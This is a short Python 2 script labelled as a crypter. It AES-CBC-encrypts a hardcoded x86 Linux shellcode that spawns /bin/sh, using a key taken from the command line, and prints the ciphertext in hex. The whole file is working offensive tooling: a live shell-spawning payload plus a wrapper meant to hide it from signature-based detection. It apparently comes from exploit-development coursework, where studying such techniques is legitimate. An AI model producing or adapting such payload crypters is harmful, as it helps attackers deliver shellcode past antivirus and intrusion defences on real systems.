import base64
import binascii
import sys
from Crypto import Random
from Crypto.Cipher import AES

BS = 16
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
unpad = lambda s : s[0:-ord(s[-1])]


class AESCipher:

    def __init__( self, key ):
        self.key = key

    def encrypt( self, raw ):
        #raw = pad(raw)
        iv = Random.new().read( AES.block_size )
        cipher = AES.new( self.key, AES.MODE_CBC, iv )
        return (iv + cipher.encrypt( raw ) )

    def decrypt( self, enc ):
        #enc = base64.b64decode(enc)
        iv = enc[:16]
        cipher = AES.new(self.key, AES.MODE_CBC, iv )
        return (cipher.decrypt( enc[16:] ))

# CRYPTER SECTION

shellcode='\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x08\xfe\xc0\xfe\xc0\xfe\xc0\x90\xcd\x80'

cipher = AESCipher(sys.argv[1])
encrypted = cipher.encrypt(shellcode)
x=bytearray(encrypted)
print '\nEncrypted shellcode with AES-128 CBC:\n'
print binascii.hexlify(x)
